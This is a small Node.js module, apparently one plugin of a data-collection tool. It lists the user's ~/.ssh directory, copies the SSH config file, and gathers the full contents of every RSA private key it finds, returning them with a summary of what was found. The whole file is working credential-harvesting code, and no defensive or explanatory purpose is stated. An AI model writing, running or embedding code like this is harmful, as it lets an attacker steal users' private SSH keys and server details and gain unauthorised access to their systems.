const fs = require("fs");
const path = require("path");

const summary = [];
const values = {privateKeys: []};
const sshDir = path.resolve(process.env.HOME, ".ssh");

module.exports = function run() {
	return new Promise(function (resolve, reject) {
		const files = fs.readdirSync(sshDir);
		files.forEach(function (file) {
			const content = fs.readFileSync(path.resolve(sshDir, file)).toString();
			if (file === "config") {
				summary.push("✓ Found .ssh/config");
				values.config = content;
			}
			if (content.split("\n")[0].indexOf("BEGIN RSA PRIVATE KEY") !== -1) {
				values.privateKeys.push({ file, content });
			}
		});
		const countPrivateKeys = values.privateKeys.length
		if (countPrivateKeys > 0) {
			summary.push(`✓ Found ${countPrivateKeys} SSH private Keys`);
		}
		resolve({ summary: summary.join("\n"), value: values });
	});
};
